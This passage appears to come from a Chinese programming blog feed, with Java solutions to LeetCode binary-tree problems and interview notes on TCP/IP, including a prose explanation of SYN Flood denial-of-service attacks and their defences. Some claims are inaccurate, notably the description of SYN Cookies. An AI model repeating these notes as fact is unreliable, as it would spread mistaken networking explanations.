class="keyword">boolean</span> <span class="title">isBalanced</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> rHeight=<span class="number">0</span>,lHeight=<span class="number">0</span>;</span><br><span class="line">       <span class="keyword">if</span>(root==<span class="keyword">null</span>)</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">       rHeight = checkHeight(root.right,rHeight);</span><br><span class="line">       lHeight = checkHeight(root.left,lHeight);</span><br><span class="line">       <span class="keyword">return</span> Math.abs(rHeight-lHeight)&lt;=<span class="number">1</span>&amp;&amp;isBalanced(root.left)&amp;&amp;isBalanced(root.right);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">checkHeight</span><span class="params">(TreeNode root,<span class="keyword">int</span> height)</span></span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(root==<span class="keyword">null</span>)</span><br><span class="line">           <span class="keyword">return</span> height;</span><br><span class="line">       <span class="keyword">return</span> <span class="number">1</span>+Math.max(checkHeight(root.right, height),checkHeight(root.left, height));</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h1><span id="两棵树的判断">两棵树的判断</span></h1><h2><span id="101-symmetric-tree">101. Symmetric Tree √</span></h2><p>Given a binary tree, check whether it is a mirror of itself (ie, symmetric around its center).</p><p>For example, this binary tree <code>[1,2,2,3,4,4,3]</code> is symmetric:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    1</span><br><span class="line">   &#x2F; \</span><br><span class="line">  2   2</span><br><span class="line"> &#x2F; \ &#x2F; \</span><br><span class="line">3  4 4  3</span><br></pre></td></tr></table></figure><p>But the following <code>[1,2,2,null,3,null,3]</code> is not:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  1</span><br><span class="line"> &#x2F; \</span><br><span class="line">2   2</span><br><span class="line"> \   \</span><br><span class="line"> 3    3</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSymmetric</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">return</span> checkSym(root.left,root.right);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">checkSym</span><span class="params">(TreeNode p, TreeNode q)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="keyword">null</span>&amp;&amp;q==<span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="keyword">null</span>||q==<span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> checkSym(p.left,q.right)&amp;&amp;checkSym(p.right,q.left)&amp;&amp;p.val==q.val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="100-same-tree">100. Same Tree √</span></h2><p>Given two binary trees, write a function to check if they are the same or not.</p><p>Two binary trees are considered the same if they are structurally identical and the nodes have the same value.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input:     1         1</span><br><span class="line">          &#x2F; \       &#x2F; \</span><br><span class="line">         2   3     2   3</span><br><span class="line"></span><br><span class="line">        [1,2,3],   [1,2,3]</span><br><span class="line"></span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input:     1         1</span><br><span class="line">          &#x2F;           \</span><br><span class="line">         2             2</span><br><span class="line"></span><br><span class="line">        [1,2],     [1,null,2]</span><br><span class="line"></span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure><p><strong>Example 3:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input:     1         1</span><br><span class="line">          &#x2F; \       &#x2F; \</span><br><span class="line">         2   1     1   2</span><br><span class="line"></span><br><span class="line">        [1,2,1],   [1,1,2]</span><br><span class="line"></span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSameTree</span><span class="params">(TreeNode p, TreeNode q)</span> </span>&#123; </span><br><span class="line">       <span class="keyword">if</span>(p==<span class="keyword">null</span>&amp;&amp;q==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">       <span class="keyword">if</span>(p==<span class="keyword">null</span>||q==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">       <span class="keyword">return</span> isSameTree(p.left,q.left)&amp;&amp;isSameTree(p.right,q.right)&amp;&amp;p.val==q.val;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="617-merge-two-binary-trees">617. Merge Two Binary Trees √</span></h2><p>Given two binary trees and imagine that when you put one of them to cover the other, some nodes of the two trees are overlapped while the others are not.</p><p>You need to merge them into a new binary tree. The merge rule is that if two nodes overlap, then sum node values up as the new value of the merged node. Otherwise, the NOT null node will be used as the node of new tree.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Input: </span><br><span class="line">Tree 1                     Tree 2                  </span><br><span class="line">          1                         2                             </span><br><span class="line">         &#x2F; \                       &#x2F; \                            </span><br><span class="line">        3   2                     1   3                        </span><br><span class="line">       &#x2F;                           \   \                      </span><br><span class="line">      5                             4   7                  </span><br><span class="line">Output: </span><br><span class="line">Merged tree:</span><br><span class="line">     3</span><br><span class="line">    &#x2F; \</span><br><span class="line">   4   5</span><br><span class="line">  &#x2F; \   \ </span><br><span class="line"> 5   4   7</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">mergeTrees</span><span class="params">(TreeNode t1, TreeNode t2)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(t1==<span class="keyword">null</span>&amp;&amp;t2==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">       <span class="keyword">if</span>(t1==<span class="keyword">null</span>||t2==<span class="keyword">null</span>) <span class="keyword">return</span> t1==<span class="keyword">null</span>?t2:t1;</span><br><span class="line">       t1.val=t1.val+t2.val;</span><br><span class="line">       t1.left=mergeTrees(t1.left,t2.left);</span><br><span class="line">       t1.right=mergeTrees(t1.right,t2.right);</span><br><span class="line">       <span class="keyword">return</span> t1;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="572-subtree-of-another-tree">572. Subtree of Another Tree √</span></h2><p>Given two non-empty binary trees <strong>s</strong> and <strong>t</strong>, check whether tree <strong>t</strong> has exactly the same structure and node values with a subtree of <strong>s</strong>. A subtree of <strong>s</strong> is a tree consists of a node in <strong>s</strong> and all of this node’s descendants. The tree <strong>s</strong> could also be considered as a subtree of itself.</p><p><strong>Example 1:</strong><br>Given tree s:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    3</span><br><span class="line">   &#x2F; \</span><br><span class="line">  4   5</span><br><span class="line"> &#x2F; \</span><br><span class="line">1   2</span><br></pre></td></tr></table></figure><p>Given tree t:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  4 </span><br><span class="line"> &#x2F; \</span><br><span class="line">1   2</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSubtree</span><span class="params">(TreeNode s, TreeNode t)</span> </span>&#123;</span><br><span class="line">         <span class="keyword">if</span> (s == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">return</span> isS(s,t)||isSubtree(s.left,t)||isSubtree(s.right,t);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isS</span><span class="params">(TreeNode s, TreeNode t)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(s==<span class="keyword">null</span>&amp;&amp;t==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(s==<span class="keyword">null</span>||t==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">false</span>;       </span><br><span class="line">        <span class="keyword">return</span> t.val==s.val&amp;&amp;isS(s.left,t.left)&amp;&amp;isS(s.right,t.right);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络</title>
      <link href="/2020/03/30/Network/"/>
      <url>/2020/03/30/Network/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>整理了计算机网络的常考知识点</p><a id="more"></a><!-- toc --><ul><li><a href="#tcpip">TCP/IP</a><ul><li><a href="#三次握手"><em>三次握手</em></a><ul><li><a href="#syn-flood攻击">SYN Flood攻击 √</a><ul><li><a href="#定义">定义</a></li><li><a href="#原理">原理</a></li><li><a href="#防范机制"><em>防范机制</em></a></li></ul></li></ul></li><li><a href="#tcp报文头"><em>TCP报文头</em> √</a><ul><li><a href="#定义"><em>定义</em></a><ul><li><a href="#三次握手">三次握手</a></li><li><a href="#四次挥手">四次挥手</a></li></ul></li></ul></li><li><a href="#和udp的区别"><em>和UDP的区别</em></a><ul><li><a href="#udp的报头-"><em>UDP的报头</em> -</a></li><li><a href="#基于-udp-的几个例子"><em>基于 UDP 的几个例子</em></a></li></ul></li><li><a href="#可靠性">可靠性：</a></li><li><a href="#拥塞控制"><em>拥塞控制</em></a></li><li><a href="#滑动窗口"><em>滑动窗口</em></a><ul><li><a href="#定义-1"><em>定义</em></a></li><li><a href="#作用"><em>作用</em></a></li></ul></li><li><a href="#常见问题"><em>常见问题：</em></a></li></ul></li><li><a href="#http">HTTP</a><ul><li><a href="#主要特点">主要特点 √</a></li></ul></li><li><a href="#请求响应的步骤">请求\响应的步骤</a></li><li><a href="#在浏览器键入url按下回车之后的流程面试">在浏览器键入URL，按下回车之后的流程（面试）</a><ul><li><a href="#请求结构请求行-请求头部-请求数据">请求结构（请求行-请求头部-请求数据）</a><ul><li><a href="#首先看看http请求消息就是浏览器丢给服务器的">首先看看http请求消息（就是浏览器丢给服务器的）：</a></li><li><a href="#请求行">请求行</a></li><li><a href="#请求头"><strong>请求头</strong></a></li></ul></li><li><a href="#响应结构状态行-响应头部-响应正文"><em>响应结构（状态行-响应头部-响应正文）</em></a></li><li><a href="#keep-alive模式"><em>Keep-Alive模式</em></a></li><li><a href="#状态码">状态码</a></li><li><a href="#get和post的区别-">GET和POST的区别 -</a></li><li><a href="#什么是cookie">什么是Cookie √</a></li></ul></li><li><a href="#什么是session-">什么是Session -</a><ul><li><a href="#cookie和session的区别">Cookie和Session的区别</a><ul><li><a href="#1-存储位置不同">1、存储位置不同</a></li><li><a href="#2-存储容量不同">2、存储容量不同</a></li><li><a href="#3-存储方式不同">3、存储方式不同</a></li><li><a href="#4-隐私策略不同">4、隐私策略不同</a></li><li><a href="#5-有效期上不同">5、有效期上不同</a></li><li><a href="#6-服务器压力不同">6、服务器压力不同</a></li><li><a href="#7-浏览器支持不同">7、浏览器支持不同</a></li><li><a href="#8-跨域支持上不同">8、跨域支持上不同</a></li></ul></li><li><a href="#http和https的区别">Http和Https的区别</a><ul><li><a href="#ssl安全套接层">SSL（安全套接层）</a></li><li><a href="#https数据传输流程">Https数据传输流程：</a></li><li><a href="#二-http与https的区别">二、Http与Https的区别</a></li><li><a href="#五-https的缺点对比优点">五、Https的缺点（对比优点）</a></li></ul></li></ul></li><li><a href="#各层常见协议">各层常见协议</a></li><li><a href="#socket">Socket</a><ul><li><a href="#tcpserverclient">TCPServer/Client</a></li><li><a href="#udpserverclient">UDPServer/Client</a><ul><li><a href="#dns解析了解">DNS解析（了解）</a></li></ul></li></ul></li></ul><!-- tocstop --><p><img src="clip_image002.png" alt></p><h2><span id="tcpip">TCP/IP</span></h2><h3><span id="三次握手"><em>三次握手</em></span></h3><h4><span id="syn-flood攻击">SYN Flood攻击 √</span></h4><h5><span id="定义">定义</span></h5><p>SYN Flood是当前最流行的DoS（拒绝服务攻击）与DDoS（分布式拒绝服务攻击）的方式之一，这是一种利用TCP协议缺陷，发送大量伪造的TCP连接请求，从而使得被攻击方资源耗尽（CPU满负荷或内存不足）的攻击方式。</p><h5><span id="原理">原理</span></h5><p>大家都知道，TCP与UDP不同，它是基于连接的，也就是说：为了在服务端和客户端之间传送TCP数据，必须先建立一个虚拟链路，也就是TCP连接，建立TCP连接的标准过程是这样的：</p><p>首先，请求端（客户端）发送一个包含SYN标志的TCP报文，SYN即同步（Synchronize），同步报文会指明客户端使用的端口以及TCP连接的初始序号；</p><p>第二步，服务器在收到客户端的SYN报文后，将返回一个SYN+ACK的报文，表示客户端的请求被接受，同时TCP序号被加一，ACK即确认（Acknowledgement）。</p><p>第三步，客户端也返回一个确认报文ACK给服务器端，同样TCP序列号被加一，到此一个TCP连接完成。</p><p>以上的连接过程在TCP协议中被称为三次握手（Three-way Handshake）。</p><p>假设一个用户向服务器发送了SYN报文后突然死机或掉线，那么服务器在发出SYN+ACK应答报文后是无法收到客户端的ACK报文的（第三次握手无法完成），这种情况下服务器端一般会重试（再次发送SYN+ACK给客户端）并等待一段时间后丢弃这个未完成的连接，这段时间的长度我们称为SYN Timeout，一般来说这个时间是分钟的数量级（大约为30秒-2分钟）；一个用户出现异常导致服务器的一个线程等待1分钟并不是什么很大的问题，但如果有一个恶意的攻击者大量模拟这种情况，服务器端将为了维护一个非常大的半连接列表而消耗非常多的资源—-数以万计的半连接，即 使是简单的保存并遍历也会消耗非常多的CPU时间和内存，何况还要不断对这个列表中的IP进行SYN+ACK的重试。实际上如果服务器的TCP/IP栈不够强大，最后的结果往往是堆栈溢出崩溃—即使服务器端的系统足够强大，服务器端也将忙于处理攻击者伪造的TCP连接请求而无暇理睬客户的正常请求（毕竟客户端的正常请求比率非常之小），此时从正常客户的角度看来，服务器失去响应，这种情况我们称作：服务器端受到了SYN Flood攻击（SYN洪水攻击）。</p><h5><span id="防范机制"><em>防范机制</em></span></h5><p>Ø 第一种是缩短SYN Timeout时间，由于SYN Flood攻击的效果取决于服务器上保持的SYN半连接数，这个值=SYN攻击的频度 x SYN Timeout，所以通过缩短从接收到SYN报文到确定这个报文无效并丢弃改连接的时间，例如设置为20秒以下（过低的SYN Timeout设置可能会影响客户的正常访问），可以成倍的降低服务器的负荷。</p><p>Ø 第二种方法是设置SYN Cookie，就是给每一个请求连接的IP地址分配一个Cookie，如果短时间内连续受到某个IP的重复SYN报文，就认定是受到了攻击，以后从这个IP地址来的包会被一概丢弃。</p><p>Ø 可是上述的两种方法只能对付比较原始的SYN Flood攻击，缩短SYN Timeout时间仅在对方攻击频度不高的情况下生效，SYN Cookie更依赖于对方使用真实的IP地址，如果攻击者以数万/秒的速度发送SYN报文，同时利用SOCK_RAW随机改写IP报文中的源地址，以上的方法将毫无用武之地。</p><h3><span id="tcp报文头"><em>TCP报文头</em> √</span></h3><h5><span id="定义"><em>定义</em></span></h5><p><img src="image-20200330094555619.png" alt></p><p>序列号seq：占4个字节，用来标记数据段的顺序，TCP把连接中发送的所有数据字节都编上一个序号，第一个字节的编号由本地随机产生；给字节编上序号后，就给每一个报文段指派一个序号；序列号seq就是这个报文段中的第一个字节的数据编号。 </p><p>  确认号ack：占4个字节，期待收到对方下一个报文段的第一个数据字节的序号；序列号表示报文段携带数据的第一个字节的编号；而确认号指的是期望接收到下一个字节的编号；因此当前报文段最后一个字节的编号+1即为确认号。 </p><p>  确认ACK：占1位，仅当ACK=1时，确认号字段才有效。ACK=0时，确认号无效 </p><p>  同步SYN：连接建立时用于同步序号。当SYN=1，ACK=0时表示：这是一个连接请求报文段。若同意连接，则在响应报文段中使得SYN=1，ACK=1。因此，SYN=1表示这是一个连接请求，或连接接受报文。SYN这个标志位只有在TCP建产连接时才会被置1，握手完成后SYN标志位被置0。 </p><p>  终止FIN：用来释放一个连接。FIN=1表示：此报文段的发送方的数据已经发送完毕，并要求释放运输连接 </p><p>  PS：ACK、SYN和FIN这些大写的单词表示标志位，其值要么是1，要么是0；ack、seq小写的单词表示序号。</p><p> <img src="image-20200330094814772.png" alt></p><h4><span id="三次握手">三次握手</span></h4><p><img src="image-20200330094908871.png" alt></p><p>第一次握手：建立连接时，客户端发送syn包（syn=x）到服务器，并进入SYN_SENT状态，等待服务器确认；SYN：同步序列编号（Synchronize Sequence Numbers）。</p><p>第二次握手：服务器收到syn包，必须确认客户的SYN（ack=x+1），同时自己也发送一个SYN包（syn=y），即SYN+ACK包，此时服务器进入SYN_RECV状态；</p><p>第三次握手：客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK(ack=y+1），此包发送完毕，客户端和服务器进入ESTABLISHED（TCP连接成功）状态，完成三次握手。</p><h4><span id="四次挥手">四次挥手</span></h4><p><img src="image-20200330095258015.png" alt></p><p>1）客户端进程发出连接释放报文，并且停止发送数据。释放数据报文首部，FIN=1，其序列号为seq=u（等于前面已经传送过来的数据的最后一个字节的序号加1），此时，客户端进入FIN-WAIT-1（终止等待1）状态。 TCP规定，<font color="red">FIN报文段即使不携带数据，也要消耗一个序号。</font></p><p>2）服务器收到连接释放报文，发出确认报文，ACK=1，ack=u+1，并且带上自己的序列号seq=v，此时，服务端就进入了CLOSE-WAIT（关闭等待）状态。TCP服务器通知高层的应用进程，客户端向服务器的方向就释放了，这时候处于半关闭状态，即客户端已经没有数据要发送了，但是服务器若发送数据，客户端依然要接受。这个状态还要持续一段时间，也就是整个CLOSE-WAIT状态持续的时间。</p><p>3）客户端收到服务器的确认请求后，此时，客户端就进入FIN-WAIT-2（终止等待2）状态，等待服务器发送连接释放报文（在这之前还需要接受服务器发送的最后的数据）。</p><p>4）服务器将最后的数据发送完毕后，就向客户端发送连接释放报文，FIN=1，ack=u+1，由于在半关闭状态，服务器很可能又发送了一些数据，假定此时的序列号为seq=w，此时，服务器就进入了LAST-ACK（最后确认）状态，等待客户端的确认。</p><p>5）客户端收到服务器的连接释放报文后，必须发出确认，ACK=1，ack=w+1，而自己的序列号是seq=u+1，此时，客户端就进入了TIME-WAIT（时间等待）状态。注意此时TCP连接还没有释放，必须经过2∗∗MSL（最长报文段寿命MaximumSegmentLifetime）的时间后，当客户端撤销相应的TCB后，才进入CLOSED状态。</p><p>6）服务器只要收到了客户端发出的确认，立即进入CLOSED状态。同样，撤销TCB（传输控制块）后，就结束了这次的TCP连接。可以看到，服务器结束TCP连接的时间要比客户端早一些。</p><h3><span id="和udp的区别"><em>和UDP的区别</em></span></h3><p>TCP 是面向连接的，UDP 是面向无连接的</p><p>UDP程序结构较简单</p><p>TCP 是面向字节流的，UDP 是基于数据报的</p><p>TCP 保证数据正确性，UDP 可能丢包</p><p>TCP 保证数据顺序，UDP 不保证</p><p><strong>TCP的优点</strong>：<font color="orange"> 可靠，稳定</font> TCP的可靠体现在TCP在传递数据之前，会有三次握手来建立连接，而且在数据传递时，有<font color="orange"> 确认、窗口、重传、拥塞控制机制</font>，在数据传完后，还会断开连接用来节约系统资源。 TCP的缺点：<font color="blue">  慢，效率低，占用系统资源高，易被攻击</font> 。</p><p><strong>UDP的优点</strong>： <font color="orange"> 快，比TCP稍安全</font> UDP没有TCP的握手、确认、窗口、重传、拥塞控制等机制，UDP是一个无状态的传输协议，所以它在传递数据时非常快。没有TCP的这些机制，UDP较TCP被攻击者利用的漏洞就要少一些。但UDP也是无法避免攻击的，比如：UDP Flood攻击…… UDP的缺点：<font color="blue"> 不可靠，不稳定</font> 因为UDP没有TCP那些可靠的机制，在数据传递时，如果网络质量不好，就会很容易丢包。 基于上面的优缺点，</p><p>那么： 什么时候应该使用TCP： 当对网络通讯质量有要求的时候，比如：整个数据要准确无误的传递给对方，这往往用于一些要求可靠的应用，比如HTTP、HTTPS、FTP等传输文件的协议，POP、SMTP等邮件传输的协议。 在日常生活中，常见使用TCP协议的应用如下： 浏览器，用的HTTP FlashFXP，用的FTP Outlook，用的POP、SMTP Putty，用的Telnet、SSH QQ文件传输 ………… 什么时候应该使用UDP： 当对网络通讯质量要求不高的时候，要求网络通讯速度能尽量的快，这时就可以使用UDP。 比如，日常生活中，常见使用UDP协议的应用如下： QQ语音 QQ视频 TFTP ……DNS,DHCP</p><h5><span id="udp的报头-"><em>UDP的报头</em> -</span></h5><p><img src="clip_image002.jpg" alt="UDP 包头"></p><h5><span id="基于-udp-的几个例子"><em>基于 UDP 的几个例子</em></span></h5><p>直播。直播对实时性的要求比较高，宁可丢包，也不要卡顿的，所以很多直播应用都基于 UDP 实现了自己的视频传输协议</p><p>实时游戏。游戏的特点也是实时性比较高，在这种情况下，采用自定义的可靠的 UDP 协议，自定义重传策略，能够把产生的延迟降到最低，减少网络问题对游戏造成的影响</p><p>物联网。一方面，物联网领域中断资源少，很可能知识个很小的嵌入式系统，而维护 TCP 协议的代价太大了；另一方面，物联网对实时性的要求也特别高。比如 Google 旗下的 Nest 简历 Thread Group，推出了物联网通信协议 Thread，就是基于 UDP 协议的</p><h3><span id="可靠性">可靠性：</span></h3><ul><li>应答机制，三次握手、四次挥手、滑动窗口、超时重传</li></ul><h3><span id="拥塞控制"><em>拥塞控制</em></span></h3><ul><li><p>慢开始</p><blockquote><p>从小到大逐渐增大发送窗口，每收到一个新报文段的确认后，可以增大一个SMSS（发送方最大报文段）的值，TCP设置一个慢开始门限状态，拥塞窗口大小超过此值时进入拥塞控制。</p></blockquote></li><li><p>拥塞避免算法</p><blockquote><p>按拥塞窗口按线性增长，比慢开始算法的拥塞增长缓慢。</p></blockquote></li><li><p>快重传</p><blockquote><p>连续收到3个重复确认，立即重传接收方尚未收到的报文段。</p></blockquote></li><li><p>快恢复算法</p><blockquote><p>当连续收到3个重复确认，执行乘法减小，门限减半。</p></blockquote></li></ul><h3><span id="滑动窗口"><em>滑动窗口</em></span></h3><p>我们能不能把第一个和第二个包发过去后，收到第一个确认包就把第三个包发过去呢？而不是去等到第二个包的确认包才去发第三个包。这样就很自然的产生了我们”滑动窗口”的实现。</p><p><img src="clip_image002-1585536742055.png" alt></p><p>在图中，我们可看出灰色1号2号3号包已经发送完毕，并且已经收到Ack。这些包就已经是过去式。4、5、6、7号包是黄色的，表示已经发送了。但是并没有收到对方的Ack，所以也不知道接收方有没有收到。8、9、10号包是绿色的。是我们还没有发送的。这些绿色也就是我们接下来马上要发送的包。 可以看出我们的窗口正好是11格。后面的11-16还没有被读进内存。要等4号-10号包有接下来的动作后，我们的包才会继续往下发送。</p><p><strong>正常情况</strong></p><p><img src="clip_image004.png" alt></p><p>可以看到4号包对方已经被接收到，所以被涂成了灰色。“窗口”就往右移一格，这里只要保证“窗口”是7格的。 我们就把11号包读进了我们的缓存。进入了“待发送”的状态。8、9号包已经变成了黄色，表示已经发送出去了。接下来的操作就是一样的了，确认包后，窗口往后移继续将未发送的包读进缓存，把“待发送“状态的包变为”已发送“。</p><p><strong>丢包情况</strong></p><p>有可能我们包发过去，对方的Ack丢了。也有可能我们的包并没有发送过去。从发送方角度看就是我们没有收到Ack。</p><p><img src="clip_image006.png" alt></p><p>发生的情况：一直在等Ack。如果一直等不到的话，我们也会把读进缓存的待发送的包也一起发过去。但是，这个时候我们的窗口已经发满了。所以并不能把12号包读进来，而是始终在等待5号包的Ack。</p><p>如果我们这个Ack始终不来怎么办呢？</p><p><strong>超时重发</strong></p><p>这时候我们有个解决方法：超时重传<br> 这里有一点要说明：这个Ack是要按顺序的。必须要等到5的Ack收到，才会把6-11的Ack发送过去。这样就保证了滑动窗口的一个顺序。</p><p><img src="clip_image008.png" alt></p><p>这时候可以看出5号包已经接受到Ack，后面的6、7、8号包也已经发送过去已Ack。窗口便继续向后移动。</p><p><img src="clip_image009.png" alt></p><h5><span id="定义"><em>定义</em></span></h5><p>RTT：发送一个数据包到收到对应ACK所花费的时间</p><p>RTO: 重传时间间隔</p><h5><span id="作用"><em>作用</em></span></h5><p>保证了TCP的可靠性</p><p>保证TCP的流控特性</p><p><img src="clip_image011.jpg" alt></p><p>LastByteAcked：已发送并已收到ACK</p><p>LastByteSent： 已发送未收到ACK</p><p>LastByteWritten： 未发送的包（当前程序准备好的数据）</p><p>LastByteRead：上层应用读完收到且发送ACK的</p><p>NextByteExpected：已收到但是未发送ACK</p><p>LastByteRcvd：已收到的最后一个字节的位置（可能有些seq未到达）</p><p>AdvertiseWindow： 接收方能接收（处理）的大小</p><p>EffectiveWindow： 发送方还可以发送的数据</p><h3><span id="常见问题"><em>常见问题：</em></span></h3><p>【问题1】为什么连接的时候是三次握手，关闭的时候却是四次握手？ </p><p>答：因为当Server端收到Client端的SYN连接请求报文后，可以直接发送SYN+ACK报文。其中ACK报文是用来应答的，SYN报文是用来同步的。但是关闭连接时，当Server端收到FIN报文时，很可能并不会立即关闭SOCKET，所以只能先回复一个ACK报文，告诉Client端，”你发的FIN报文我收到了”。只有等到我Server端所有的报文都发送完了，我才能发送FIN报文，因此不能一起发送。故需要四步握手。</p><p>【问题2】为什么TIME_WAIT状态需要经过2MSL(最大报文段生存时间)才能返回到CLOSE状态？ </p><p>答：虽然按道理，四个报文都发送完毕，我们可以直接进入CLOSE状态了，但是我们必须假想网络是不可靠的，有可能最后一个ACK丢失。所以TIME_WAIT状态就是用来重发可能丢失的ACK报文。在Client发送出最后的ACK回复，但该ACK可能丢失。Server如果没有收到ACK，将不断重复发送FIN片段。所以Client不能立即关闭，它必须确认Server接收到了该ACK。Client会在发送出ACK之后进入到TIME_WAIT状态。Client会设置一个计时器，等待2MSL的时间。如果在该时间内再次收到FIN，那么Client会重发ACK并再次等待2MSL。所谓的2MSL是两倍的MSL(Maximum Segment Lifetime)。MSL指一个片段在网络中最大的存活时间，2MSL就是一个发送和一个回复所需的最大时间。如果直到2MSL，Client都没有再次收到FIN，那么Client推断ACK已经被成功接收，则结束TCP连接。</p><p>【问题3】为什么不能用两次握手进行连接？ </p><p>答：3次握手完成两个重要的功能，既要双方做好发送数据的准备工作(双方都知道彼此已准备好)，也要允许双方就初始序列号进行协商，这个序列号在握手过程中被发送和确认。</p><p>​    现在把三次握手改成仅需要两次握手，死锁是可能发生的。作为例子，考虑计算机S和C之间的通信，假定C给S发送一个连接请求分组，S收到了这个分组，并发 送了确认应答分组。按照两次握手的协定，S认为连接已经成功地建立了，可以开始发送数据分组。可是，C在S的应答分组在传输中被丢失的情况下，将不知道S 是否已准备好，不知道S建立什么样的序列号，C甚至怀疑S是否收到自己的连接请求分组。在这种情况下，C认为连接还未建立成功，将忽略S发来的任何数据分 